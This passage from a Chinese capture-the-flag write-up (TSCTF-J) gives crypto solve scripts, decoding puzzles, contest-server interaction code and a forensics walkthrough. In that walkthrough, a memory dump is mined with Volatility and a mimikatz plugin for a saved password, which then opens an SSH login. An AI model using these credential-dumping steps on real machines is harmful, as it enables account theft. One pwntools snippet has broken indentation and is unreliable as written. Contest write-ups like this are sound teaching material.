cipher1 = 0x57765d8a8d0d74a3f6e3151cc1276b8db6e790d691f7d06713c1d5791164902f6add5a4350512225034d114ae59603a431d1b8ebc956bdc30a3d69cc364649dada23153483bfbf1cfb06ffb22ca9e969674d68a2dae6c9482dfe7b95561035396996473d37cdae2c7e6bda62face36d487d31810cad3382a37c881ea694eb45b4a1788eb1f7865ff3105a3669e7bf39bb0e04d46b98acbfefbdebeb3c2e967e1db553420337db750805d08483760f7abb9ad69d4fc489ec3c2cc9c10778fe03090b8b0b33854047aafab676c4a2a4d6b94b4df6e2ed6f23d9ba6e8713cbeeb5aab5bbf23558afade67460d2561f0a60a26a8c064550eb858b8e25fcf72bcb581
flag1 = long_to_bytes(gmpy2.powmod(cipher1, d, n))


generator = DES.new(KEY.encode(), DES.MODE_ECB)
cipher2 = b'\x83\xce\x8a\xdac)\xd2\xa41\xe26\xd5\x12\xcf\x9aV;%\x80\xc1\x87\x97\xe0\xc3\x03\x17\xfeR\x97b\x86\xf9"\x1c\xde\xf4\xc1F\xd5\x13\x1e$\xc3\xb8\x84Z}\xac'
flag2 = generator.decrypt(cipher2)

print(flag1 + flag2)

```
![](https://md.byr.moe/uploads/upload_b34292c72a82d220e69fc5df99ed1fcc.png)


最终得到flag：**TSCTF-J{C0mbinAt0rial_M4themat1cs_aNd_Ha$h-Alg0rithms_aRe_1mportaNt_in_CryptOgraphy}**


### 锟斤拷烫烫烫

&emsp;&emsp;如果大家看到题目首先想到的是乱码，可能就想复杂了。要注意这是一道密码题，仔细观察附件中密文的特征：有斜杠作为分隔符，**锟斤拷**和**烫烫烫**这两个词反复出现，结合后续给出的hint：**永不消逝的电波**，这种二元编码结构很容易联想到**摩斯电码**。我们不妨尝试用`.`和`-`来分别替换**锟斤拷**和**烫烫烫**，得到如下结果：

`NBXXKZDFMJXXQ5LFNJUW4Z3ZMVWGK4LVNY======`

&emsp;&emsp;继续观察，有人说这是**base64**，我说base64最多2个等号，可是这里有6个，而且只由大写字母和几个`2-7`之间的数字组成，很显然是**base32**，拿去解密一下：

![](https://md.byr.moe/uploads/upload_ba52f199e8dd08bfd96b13e799204c72.png)

&emsp;&emsp;解密结果为：**houdeboxuejingyelequn**，这是我们北邮校训**厚德博学，敬业乐群**的拼音，大家一定要牢记于心。

最终的flag为：**TSCTF-J{houdeboxuejingyelequn}**


### TSLCG

LCG指的是**线性同余生成器**，是某些**流密码**中的一个组件。


这里主要考察coppersmith一元、二元攻击。


首先使用sage解出seed的值：
```python
import itertools

def small_roots(f, bounds, m=1, d=None):
    if not d:
        d = f.degree()
        R = f.base_ring()
        N = R.cardinality()
        f /= f.coefficients().pop(0)
        f = f.change_ring(ZZ)

        G = Sequence([], f.parent())
        for i in range(m + 1):
            base = N ^ (m - i) * f ^ i
            for shifts in itertools.product(range(d), repeat=f.nvariables()):
                g = base * prod(map(power, f.variables(), shifts))
                G.append(g)

        B, monomials = G.coefficient_matrix()
        monomials = vector(monomials)

        factors = [monomial(*bounds) for monomial in monomials]
        for i, factor in enumerate(factors):
            B.rescale_col(i, factor)

        B = B.dense_matrix().LLL()

        B = B.change_ring(QQ)
        for i, factor in enumerate(factors):
            B.rescale_col(i, 1 / factor)

        H = Sequence([], f.parent().change_ring(QQ))
        for h in filter(None, B * monomials):
            H.append(h)
            I = H.ideal()
            if I.dimension() == -1:
                H.pop()
            elif I.dimension() == 0:
                roots = []
                for root in I.variety(ring=ZZ):
                    root = tuple(R(root[var]) for var in f.variables())
                    roots.append(root)
                    return roots
        return []
a = 66049097108335558963599462325352004349196440983787973012154834055223278552243
b = 58778610070745012111268957905648214692250237552175582670384593154851812940615
c = 87271053327233539428234615627687422672160996771767343910174321955213583291651
p = 10868037973060379897517464428969893792343052242065595475656553807087121596315403391254909327053677859009190523765061629590951583984262833068639997888880539
state1 = 262148698680921001175421120599716418097319550624522628153987377397958802062356000994391778650923766357244426122007373782185786726193172
state2 = 401884766935199169199788772193993026678609973471503558823110122993922083706981232258745891948795121206605806626287539328884951387619273
PR.< s1_low, s2_low > = PolynomialRing(Zmod(p))
f = a * ((state1 << 64) + s1_low) ^ 2 + b * ((state1 << 64) + s1_low) + c - (state2 << 64) - s2_low
state1 = small_roots(f, (2 ^ 64, 2 ^ 64), m=3)[0][0] + (state1 << 64)
state2 = small_roots(f, (2 ^ 64, 2 ^ 64), m=3)[0][1] + (state2 << 64)
print(state2)
P.<x> = PolynomialRing(Zmod(p))

f = a * x * x + b * x + c - state1
f = f.monic()
print(f.roots())


7413465442776029635335381624109055621255883021586684327429035996877122058561862087563632988550399299374901239335916812075528706319932839670684104380724639
[(4010130222574435198786541082285397140224138632857047747447374494471153359070578687916927206026231165246403410000038249578148448038010613629427497007828262, 1), (114127178394862236957732693340243151972451066756413868150990818887903436283643, 1)]

```

得到`seed = 114127178394862236957732693340243151972451066756413868150990818887903436283643`

然后利用**seed**生成流密钥，解密密文即可。


exp如下：
```python
from Crypto.Util.number import *
from hashlib import sha256
from string import *

seed = 114127178394862236957732693340243151972451066756413868150990818887903436283643


class TSLCG:
    def __init__(self):
        self.seed = seed
        self.x = 66049097108335558963599462325352004349196440983787973012154834055223278552243
        self.y = 58778610070745012111268957905648214692250237552175582670384593154851812940615
        self.z = 87271053327233539428234615627687422672160996771767343910174321955213583291651
        self.p = 10868037973060379897517464428969893792343052242065595475656553807087121596315403391254909327053677859009190523765061629590951583984262833068639997888880539

    def next(self):
        self.seed = (self.x * self.seed * self.seed + self.y * self.seed + self.z) % self.p
        return self.seed >> 64

    def output(self):
        print("x =", self.x)
        print("y =", self.y)
        print("z =", self.z)
        print("p =", self.p)
        print(self.p.bit_length())


cipher = [114229795568504971125782454865344339936013525422118373134592376093829829516014,
          22769411783508881047430971085147654077656514168961572112677860186690175089712,
          46291760001991976612273529003035567070568475337456160821616020644107892531604,
          27641622913592827343226232177800182137440141732081256778974371842335403643134,
          33458285477095920429206777096682559886648635912068650186906452689491369439766,
          48228635849658323338966183262511630898709277777295418480005838633026904122857,
          70620612283675094944901482824929075589026264800750560928672143799575103933939,
          107641787039934392989362653657534346630042708998540503979405750206017365643098,
          16030443495344158969039716115001566341085973781658170648603472668849073881258,
          64711812760155670057066940703741049741097964114045582791519105166797419689947,
          7030673665433460167804955967435195566833523225368452112698311932690918675377,
          33155594562856486304238949783077755264260874217041679459671273896511852655218,
          20003911685460432810394623659479618827834096045324420926680879408496483819074,
          54482799376949793757884922920906740524705223884815550440676980002679482723571,
          71310266261359820122907179938748698055435339326097573822820941367099658012193,
          28892492267641373213618756749288080324024060139550293737616026777991809188908,
          80094219384671492046024714806646899992069533756708027229423188052316325604511,
          24040016938340868410187543447028728547521850436748992716756132127265188353732,
          3974773472235895228081303930587903174164290341986858960845222557083916316978,
          23216230749785935846110253946550320312579094518064092868910467630121678033822,
          64426439981564996820822934026572513843836458973442880776010946722431739943078,
          47150495547090693936936980362877776068499836782600158979323206013520849008186,
          112378043511183668083984918788779310952845885554299561911738361708700766072542,
          49927419370420717266424772581788618187359541020868681981692282111079825356609,
          24751255841085089553499649217299052565985821845489691077179394687281421724879,
          15735461066373159077288385837489684020259112119794269795940072233907916279966,
          103538668036619412071977622829453979786386275935919142368996799469341519361232,
          102144598263552959711025766927406358688610702385520630262880510158934628436700,
          66227732635380479365869764211220621819284207574992285645034753756210581436507,
          56471411182932803106152131816831253593865773525501820539024516742521735851803,
          23097905742734656317994654329542319726751873209876711372237325653531201003453,
          85237826971754001588593298982229179392487422963476269885255909836528571561418,
          95254891578907404941886576563553810956215947727271534803869103673549026750509,
          7094673797512726623266272765288224129927625698082327370321240891950740709290,
          74025025279479525436859429595845426345930227154735055641214581616171635155951,
          75045809865646841525503300006926481440402256322341736049404956337297279633396,
          31708336981143054309766707280793710581118646981676118496074930284982713002330,
          83395627989650218249481616105659686088457160438230877494138009455144797101248,
          54798381697541621730106478886583794669243164828903036662543316587357907997900,
          92096786801028456883871264729393207450577810473797771974176273927404222475038,
          82615579631848076308743158044256432296118638278174077333611620245042471677385,
          2788037395103974692923291780793045461336133292482266193299669686910229221726,
          70154155932975900080817144071031930343287345079483970819526308611379580761049,
          94770535666628322921484767094711038642932388627174401237304414608646506658733,
          78646075986507106970767052761243051063580005161706539532729508070064249262254,
          48326853041623947346633552753424139132666725772570839483447172310092589246101,
          77358016884369576223979826059858637439369014836217879132819087752832825148280,
          109527890866136606357402981318404726737579527532072703951165220515883873262692,
          10477953114833836625252097103844550398771075742205767008850909255078580588653,
          53806786489399826075386484367521754401482582365659814331551081414869981355633,
          98852251094872317009306266717729046664298198862207585260205071987769240897163,
          109667626168799226728060438034267705855905660127733299026800259059841553829945,
          42734239879706985355777344369243916201756161627374862789346683636564508425022,
          2029786295510285363091465352929424588275178614184036931670591622346059502145,
          100860301504024076042085699097489911452658579541788587462713423515865899507012,
          77014589095451137676684461942120342182719576159803270737715137357808772705381,
          39644169084284422098298525726232764856522370485375870711700993612357132008879,
          80223438307892230345738335029848082261971321739050799993791694982188863466077,
          60897544514307836692847480229258682299838984801709358070340001767221341653238,
          6598393089465577242785421279521103943389078606703302673095328638037806651141,
          75077964585453819389826392567436181472696302907640691632707998288930094241715,
          90388687472866163736952581390664163290524597434105211522014485193324978444326,
          53415701909853624930544776138935074882685825310379913348572563165422075144624,
          92707489409383453529244208589987956519844652537139620068811160121667901798969,
          85002593431327035939616519063132658978235358241706710284862523354302012539009,
          99807417500002962702254918797446317774398313121734690241568990117843618602248,
          107472947616175673790472458491434885657104043848270670183654024980933820459737,
          52828033609908775692262176531592575792446241737210467966641012588617014042985]

hashtable = []
flag = ''
lcg = TSLCG()
lcg.next()
lcg.next()
for i in printable:
    tmp = int(sha256(i.encode()).hexdigest(), 16)
    hashtable.append(pow(tmp, 3, seed))
for i in range(len(cipher)):
    tmp = lcg.next() >> 192
    ind = hashtable.index(tmp ^ cipher[i])
    flag += printable[ind]
print(flag)

```


得到flag：**TSCTF-J{L1ne@r_C0ngruent1al_Generat0r_1s_Imp0rtant_1n_Stre4m_Ciph3r}**


### Padding
预期解是这篇[论文](https://www.iacr.org/archive/pkc2005/33860001/33860001.pdf)，但显然没有人是用这个解出来的。解线性方程组，Franklin-Reiter attack等都可以解出。
### Mathematics
已知
$$
g_1 = (2p+3q)^{2021}mod\ n\\g_2=(5p+7q)^{2022}mod\ n
$$
用二项式展开结合模n条件有
$$
g_1=(2p)^{2021}+(3q)^{2021}mod\ n\\g_2=(5p)^{2022}+(7q)^{2022}mod\ n
$$
令$t_1=2^{-2021}mod\ n,\ t_2 = 5^{2021}mod\ n$可以算得
$$
g^{'}_1:=g_1t_1t_2=(5p)^{2021}+t_1t_2(3q)^{2021}mod\ n
$$
再用二项式展开，分别计算2022,2021次方，有
$$
(g{'}_1)^{2022}=(5p)^{2021*2022}+k_1q\ mod\ n\\(g_2)^{2021}=(5p)^{2021*2022}+k_2q\ mod\ n
$$
两式相减有
$$
(g^{'}_1)^{2022}-(g_2)^{2022}=(k_1-k_2)q+kn
$$
于是$gcd((g^{'}_1)^{2022}-(g_2)^{2022},n) = q.$
### L1nearAlgebra
给了一个用于计算密文的矩阵M的构造方式,其实就是Jordan矩阵。尝试几次就能看出这个矩阵计算的性质，以下以4阶举例
$$
M=\begin{bmatrix}
 2 & 1 & 0 &0\\
 0 &2  &1 &0\\
  0& 0 &2&1\\
  0&0&0&2
\end{bmatrix}\\
M^2=\begin{bmatrix}
 4 & 4 & 1 &0\\
 0 &4  &4 &1\\
  0& 0 &4&4\\
  0&0&0&4
\end{bmatrix}\\
M^3=\begin{bmatrix}
 8 & 12 & 6 &1\\
 0 &8  &12 &6\\
  0& 0 &8&12\\
  0&0&0&8
\end{bmatrix}
$$
容易复原密文。
### Padding_Revenge
就是Coppersmith short pad attack加上Franklin-Reiter attack。修改了一下密文的改造，所以对应的多项式也需要修改。
## MISC



### 北邮人之声

&emsp;&emsp;这是开始前几个小时临时出的题，因为发现Misc方向竟然没有签到题！（但是f0师傅的小游戏确实是好玩）。

&emsp;&emsp;考点有两个，首先是最最基础的**音频处理**，题目附件里的音频听上去明显很怪异，尝试倒放处理，发现是一个个英语单词，但是读速很快。然后尝试慢放音频，基本就可以听清每一个单词了。



&emsp;&emsp;第二个考点是**北约音标字母**（正式名称为国际无线电通话拼写字母）这是一种无线电通话标准。以下是其简介（摘自百度百科）：

>&emsp;&emsp;北约音标字母的字母拼法与标音系统（比如国际音标）的并没有关连，北约音标字母是用代码字表示A到Z共26个拉丁字母和0到9共10个印度阿拉伯数字用以截头表音（如Alfa代表 A，Bravo代表 B，等等）。由此，无论透过无线电或电话收发语音讯息双方之母语是否相同，尤其当须保证航行或涉及人员的安全时，众多字母与数字组成的关键配搭也可较为准确地朗读及知悉，并确保透过无线电链路传送之语音有一定的可理解性。

&emsp;&emsp;其实多数人在不了解北约音标字母的情况下也可以做出来，因为flag格式已经提示得很清晰了，TSCTF-J{XXXX}，括号内的部分都是大写字母，只需要把单词的首字母听出来就行。以下是每个字母或符号对应的单词：
```
T——TANGO
S——SIERRA
C——CHRLIE
T——TANGO
F——FOXTROT
-——hyphen
J——JULIETT
{——left bracket
W——WHISKEY
E——ECHO
L——LIMA
C——CHRLIE
O——OSCAR
M——MIKE
E——ECHO
T——TANGO
O——OSCAR
B——BRAVO
U——UNIFORM
P——PAPA
T——TANGO
}——right bracket
```

最终flag：**TSCTF-J{WELCOMETOBUPT}**


### Just_Play

非常简单的小游戏，如题面所述纯玩就能出，游戏里有很多neta和梗不知道大家有没有看出来(笑)

先说一下四部分FLAG的位置：

打败SG与AR后Bridge出现在初始村，打败Bridge获得FLAG1
![](https://md.byr.moe/uploads/upload_f39e6e4528028d99b52325a920b1682b.png)

迷宫地图中写有FLAG2（迷宫的名字“弗拉格图迷宫”本身就是明示）
![](https://md.byr.moe/uploads/upload_86badf4a08cb0b753401c410df57ce6b.png)

集齐三个宝石可以获得FLAG3
（存放黄宝石的塔是我个人认为本游戏最出彩的设计）
![](https://md.byr.moe/uploads/upload_8db6e20bf93118f88ae7167445a0ce02.png)

与大地图中的鼠鼠战斗，第五回合时鼠鼠会使用一个特殊技能
![](https://md.byr.moe/uploads/upload_c9e06b6246918a14b17f3b2ffa7f104b.png)

该技能的语音是出题人念的FLAG4
（为了让你们听清楚我还特意把背景音乐关了）
（居然有人吐槽我读英文有口音）
我读的原文是"Flag part four, in lowercase , R, I, nine, H, seven, question mark,close brace "
英语听力只要不是残疾水平，结合flag的一般格式很容易听出是ri9h7?}

TSCTF-J{Th1s_G4mE_1s_S0_Ez2zZzz_4_Y0U_ri9h7?}

然后说一下在不使用修改器的情况下怎么打(出题人测试半小时就能通)

核心道具：U盘
![](https://md.byr.moe/uploads/upload_d6f28056f6704cb4508ce98ecab71b50.png)

该装备可以让nova所有攻击都出暴击（三倍伤害）

结合nova优秀的技能组，每回合可以打出极高的火力
![](https://md.byr.moe/uploads/upload_59583fabd6027181414f1d6d39f313e6.png)


Bridge的血量为30000，每十回合会出一次高伤AOE攻击（约7k伤害）
![](https://md.byr.moe/uploads/upload_55f8db03b5dec8441a6ecfacf9e95e4c.png)

比起堆血量硬抗，因为Nova作为输出端实在过于优秀，可以直接考虑强杀Bridge

买好必要补给品后，所有多余金钱购买力量之书给Nova堆攻击，然后用叶子/无糖可乐保证Nova有足够的TP值每回合打出扫射，大约30级左右就可以打赢布瑞吉

#### 出题人碎碎念

因为赛前一段时间要忙的事太多了，这个题是抽了两天的空出的，完成度不高，设计上有很多不合理的地方：人物战力不平衡、最终boss桥的输出能力太弱给不到生存压力、技能设计上缺少交互性……

譬如A.R.的boss战中，A.R.在血量低于30%时会有一段变身，然后释放一个AOE吸血攻击
![](https://md.byr.moe/uploads/upload_04abae3f67092039b31f04b937358855.png)
![](https://md.byr.moe/uploads/upload_747d89cf92c8b1cf53075430184dc3c6.png)

预想的设计是，因为这个吸血连招恢复效率太高，一旦A.R.进入大灭状态便难以击杀，所以希望玩家在A.R.低血量时使用斩杀类技能（Nova的爆头）直取首级

![](https://md.byr.moe/uploads/upload_e0d2fa8b6466d43e63af388bf104aced.png)

但是因为数值设置上的问题……实际上即使在低血量时，Nova的扫射仍然比爆头有更高的输出，爆头这个斩杀技能就显得很没意义

另外，开不开修改器对于游戏体验的影响过大，应该设计一些恶心的机制专门针对修改器，比如根据剩余金钱数造成伤害的技能(笑)

### strange base64
一开始socat没弄好本来是misc签到的结果后上之后出解还是很少 不知道为什么
简单考察交互 
socket的解法
```python
import socket
import base64
import re
s = socket.socket()


def decode(n):
    return base64.b64decode(n).decode()


s.connect(('121.5.62.30', 10005))

while True:
    data = s.recv(1024).decode()
    b = re.findall('b\'(.*?)\'', data)
    print(data)
    if not len(b):
        print('end')
        break
    ss = decode(b[0])
    with open('result', 'a') as f:
        f.write(ss + '\n')
    s.send((ss + '\n').encode())
while True:
    data = s.recv(1024).decode()
    if len(data):
        print(data)
```
pwntools解法
```python
from pwn import *
import base64
p=connect('121.5.62.30',10005)
context.log_level='debug'
for i in range(777):
p.recvuntil(b"base64(???) = b'")
d=p.recvuntil(b"'")
d=d[:len(d)-1]
p.sendline(base64.b64decode(d).decode('utf-8').encode())
```

### Black Tea

这道题其实出的不是很好，属于是一道初见杀的题目，如果见过就会很简单，没见过的话就会很难入手……

https://www.bilibili.com/video/BV1UD4y1U7or/?spm_id_from=333.999.0.0

https://www.zhihu.com/question/52986101/answer/1414841145

最后的答案是：把所有标号为1的位置下标异或，得到的数字就是有药的红茶序号

![](https://md.byr.moe/uploads/upload_485b4ade522783071c7d5c680356208d.png)

（放一个图给你们感受下原理，想深入了解可以点开上面的链接）

### easy kali 取证
## Easy Kali取证

解压题目附件的压缩包, 发现是VMware的虚拟机文件:

![](https://md.byr.moe/uploads/upload_51d37ab1218424bdbd0cfa4799bbf0f9.png)


那就先启动, 会发现他的系统有设置密码

不过只要硬盘没有加密, 给Linux系统重设密码还是很方便的

题目给了一个[用`Single User Mode`重设密码的Hint](https://www.layerstack.com/resources/tutorials/Resetting-root-password-for-Linux-Cloud-Servers-by-booting-into-Single-User-Mode), 不过我没有参考这个, 而是直接用LiveCD启动重设的密码

空白爷在这里也找到了kali密码
![](https://md.byr.moe/uploads/upload_c85f62dbeb5cc17584a7edd9ac1b6fa6.png)

进入kali 

桌面上有俩文件

> Obviously, you have entered the hacker's computer. Memory had set the password Linux as his computer password. I think you can find his password to ssh unprocessed Linux to get the flag.
>

这是`1.txt`的内容, 说`memory`他把他电脑的密码设置成和Linux服务器一样的了

因为`1.raw`是正好2GB, 然后`file`指令又分析不出来所以然, ~~所以我也不知道这是什么文件了~~

后来Google了一下, 怀疑这是内存Dump文件, 需要用https://github.com/volatilityfoundation/volatility这款命令行工具分析一下

![不要在意我为什么直接用`memory`的电脑开始分析了, 因为我懒得再换系统了]![](https://md.byr.moe/uploads/upload_ca0368280e1c7004b4436776c64bb71a.png)


不要在意我为什么直接用`memory`的电脑开始分析了, 因为我懒得再换系统了

直接可以分析到, 它确实是一个内核层面的内存Dump并且大概率是`Win7SP1x64`系统, 那就工具一把梭, 先看看到底有什么:

![进程列表没有什么特殊的](https://md.byr.moe/uploads/upload_c95b8c5cd2e78fd9180de615ed0b6f62.png)


进程列表没有什么特殊的

因为题目中说系统密码和Linux一样, 所以先用`[lsadump`指令](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#lsadump)看一下有没有存在保存的自动登录密码:

![有但是不完全有](https://md.byr.moe/uploads/upload_383688584fefec04c3b815af28f808ca.png)


有但是不完全有

可以看到这台电脑确实是存在自动保存的密码, 但是很遗憾它似乎是经过加密的, 并不能直接取得

后来私聊了出题人，他说可以用插件解决，找了一圈之后[锁定了mimikatz这款插件](https://github.com/RealityNet/hotoloti/blob/master/volatility/mimikatz.py),试一试
![](https://md.byr.moe/uploads/upload_340c30f11400c246707066fbf7cd51b7.png)

成功找到密码，那么密码有了，服务器去哪找呢

题目里面提示数据库里面有一些东西，那就去数据库看看

经过查找，这个系统里面一共有两款数据库，`mysql`和`postgresql`，但是它们的服务都处于禁用状态：
其实可以这样

![](https://md.byr.moe/uploads/upload_e8eb6ebcb80e1f73ef78b68c2ee062f9.png)

先从MySQL开始试：

![](https://md.byr.moe/uploads/upload_efc1ab8d9d12741bc90761d834d4b23e.png)

看到有个数据库名字叫`ctf`

![](https://md.byr.moe/uploads/upload_8100e3f0d5061123140ee64e2daa0758.png)

里面有个表叫`ssh`里面正好有服务器IP

运气真好！我们拿到了服务器密码，现在用SSH连接：
![](https://md.byr.moe/uploads/upload_79d56b0f7a4a0042bd39b4b29c666c01.png)

![](https://md.byr.moe/uploads/upload_228e6b1e894ff2a89a1d6fa94afedbcc.png)

## ABSTRACT

### Abstract_culture

TSCTF-J{曾经沧海难为水除却巫山不是云}
（应该不会有人猜不出来吧）

#### 小插曲

![](https://md.byr.moe/uploads/upload_64eb57c491cbe6ef61e58d24c70e8145.png)

![](https://md.byr.moe/uploads/upload_93c9deeed451b85b5d92be91cb4775b0.png)

(后来把flag改了)

### EasterEgg

TSCTF-J{1376666}

此处进行谢罪，出题人的Helang不过关，数组下标从0而不是从1开始

![](https://md.byr.moe/uploads/upload_d37a78db7d8730d8a4da5af650376e83.png)


### Abstruct_culture_revenge

![](https://md.buptmerak.cn/uploads/upload_2449e69020fb52ad6fd6ac84729be79d.png)

7+7个emoji符号，很容易联想到一个字对应一个emoji

每个emoji的含义如下：

蛙 -> 莫言获得诺奖的作品 -> 莫言 -> 莫 （不是其他解释，想歪的自己掂量下）


牛 -> 丑牛 -> 丑 -> 愁


K -> 1k==1000 -> 千 -> 前


录制按钮 -> 录 -> 路


五点 -> 五 -> 无

脑子 -> 智力 -> 智 -> 知

鸡尾酒 -> 鸡 -> 己


八卦乾卦 -> 乾卦封象为天 -> 天

下弦月 -> 下

水瓶座 -> 水 -> 谁

天干第九位为壬 -> 壬 -> 人

水晶球 -> 占卜 -> 卜 -> 不

弓箭 -> 箭矢 -> 矢 -> 识

蘑菇 -> 菌 -> 君

***TSCTF-J{莫愁前路无知己天下谁人不识君}***

(对各位的祝愿)

#### 解题

当然，实际解题不可能这么精准猜到每一个emoji代表的字，所以猜测思路一般是通过几个确定的字得到诗句

根据调研，比较容易猜出来的字有：无（根据hint很容易猜出） 天（八卦天乾，太好猜了） 下（emoji网站搜一下就知道这个emoji是下弦月） 谁（根据hint很容易猜出）

然后就根据自身知识储备，或者直接找在线诗词网站找诗
http://m.gushiju.net

另外，出题人认为能解出这题的人都有极高的文学造纸（赞赏）
